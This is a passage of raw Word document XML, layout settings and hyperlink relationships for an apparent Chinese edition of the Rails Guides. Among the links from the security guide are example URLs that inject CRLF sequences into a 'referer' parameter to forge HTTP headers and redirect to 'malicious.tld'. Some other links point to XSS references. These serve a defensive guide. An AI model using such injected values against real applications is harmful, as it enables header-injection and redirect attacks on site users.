                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                    </w:div>
                                    <w:div w:id="685592656">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                    </w:div>
                                    <w:div w:id="508327536">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                    </w:div>
                                    <w:div w:id="1256861063">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                    </w:div>
                                    <w:div w:id="522597569">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                    </w:div>
                                    <w:div w:id="2017072376">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                    </w:div>
                                    <w:div w:id="1858033153">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                    </w:div>
                                    <w:div w:id="2791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8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30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId400" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId401" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId402" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId403" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId404" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId405" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId406" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId407" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId408" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId409" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId280" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId281" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId282" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId283" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId284" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId285" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.sqlite.org/eqp.html" TargetMode="External"/><Relationship Id="rId286" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://dev.mysql.com/doc/refman/5.6/en/explain-output.html" TargetMode="External"/><Relationship Id="rId287" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.postgresql.org/docs/current/static/using-explain.html" TargetMode="External"/><Relationship Id="rId288" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/layouts_and_rendering.html" TargetMode="External"/><Relationship Id="rId289" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId730" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://safe-erb.rubyforge.org/svn/plugins/safe_erb/" TargetMode="External"/><Relationship Id="rId731" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php" TargetMode="External"/><Relationship Id="rId732" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&amp;tabid=1" TargetMode="External"/><Relationship Id="rId733" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://groovin.net/stuff/yammer.txt" TargetMode="External"/><Relationship Id="rId734" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif" TargetMode="External"/><Relationship Id="rId735" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.xssed.com/article/9/Paper_A_PoC_of_a_cross_webmail_worm_XWW_called_Njuda_connection/" TargetMode="External"/><Relationship Id="rId736" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html" TargetMode="External"/><Relationship Id="rId737" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://namb.la/popular/tech.html" TargetMode="External"/><Relationship Id="rId738" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.securiteam.com/securitynews/5LP051FHPE.html" TargetMode="External"/><Relationship Id="rId739" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://redcloth.org/" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId410" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId411" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId412" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId413" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId414" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId415" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId416" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId417" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId418" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId419" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId290" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId291" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com/main.js" TargetMode="External"/><Relationship Id="rId292" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/indirect/jquery-rails/tree/master/vendor/assets/javascripts" TargetMode="External"/><Relationship Id="rId293" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com/main.css" TargetMode="External"/><Relationship Id="rId294" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/form_helpers.html" TargetMode="External"/><Relationship Id="rId295" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/" TargetMode="External"/><Relationship Id="rId296" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId297" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/form_helpers.html" TargetMode="External"/><Relationship Id="rId298" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html" TargetMode="External"/><Relationship Id="rId299" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/Modernizr/Modernizr/wiki/HTML5-Cross-Browser-Polyfills" TargetMode="External"/><Relationship Id="rId740" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.redcloth.org" TargetMode="External"/><Relationship Id="rId741" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html" TargetMode="External"/><Relationship Id="rId742" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://dev.rubyonrails.org/browser/plugins/in_place_editing" TargetMode="External"/><Relationship Id="rId743" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld" TargetMode="External"/><Relationship Id="rId744" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:" TargetMode="External"/><Relationship Id="rId745" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:" TargetMode="External"/><Relationship Id="rId746" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.malicious.tld" TargetMode="External"/><Relationship Id="rId747" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.malicious.tld" TargetMode="External"/><Relationship Id="rId748" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.rorsecurity.info" TargetMode="External"/><Relationship Id="rId749" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://groups.google.com/group/rubyonrails-security" TargetMode="External"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.ruby-lang.org/en/downloads" TargetMode="External"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rubyforge.org/frs/?group_id=126" TargetMode="External"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://docs.rubygems.org/read/book/1" TargetMode="External"/><Relationship Id="rId420" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId421" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId422" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId423" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId424" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId425" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId426" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId427" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId428" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId429" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="git://github.com/yaffle_watcher/yaffle.git" TargetMode="External"/><Relationship Id="rId1102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.rubygems.org" TargetMode="External"/><Relationship Id="rId1103" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://blog.thepete.net/2010/11/creating-and-publishing-your-first-ruby.html" TargetMode="External"/><Relationship Id="rId1104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/radar/guides/blob/master/gem-development.md" TargetMode="External"/><Relationship Id="rId1105" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://yehudakatz.com/2010/04/02/using-gemspecs-as-intended/" TargetMode="External"/><Relationship Id="rId1106" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://docs.rubygems.org/read/chapter/20" TargetMode="External"/><Relationship Id="rId1107" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.mbleigh.com/2008/06/11/gemplugins-a-brief-introduction-to-the-future-of-rails-plugins" TargetMode="External"/><Relationship Id="rId1108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId103" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId105" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId106" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId107" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId750" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://secunia.com/" TargetMode="External"/><Relationship Id="rId751" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ha.ckers.org/blog/" TargetMode="External"/><Relationship Id="rId752" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ha.ckers.org/xss.html" TargetMode="External"/><Relationship Id="rId753" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId754" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId755" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId756" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId757" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId758" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId759" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.sqlite.org" TargetMode="External"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.humblelittlerubybook.com" TargetMode="External"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.ruby-doc.org/docs/ProgrammingRuby/" TargetMode="External"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mislav.uniqpath.com/poignant-guide/" TargetMode="External"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rails/rails" TargetMode="External"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.rubyonrails.org/layouts_and_rendering.html" TargetMode="External"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.rubyonrails.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.infoq.com/articles/rest-introduction" TargetMode="External"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://bitworking.org/news/373/An-Introduction-to-REST" TargetMode="External"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Representational_State_Transfer" TargetMode="External"/><Relationship Id="rId430" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId431" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId432" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId433" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId434" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId435" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId436" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId437" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId438" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId439" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1110" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1114" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1116" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship 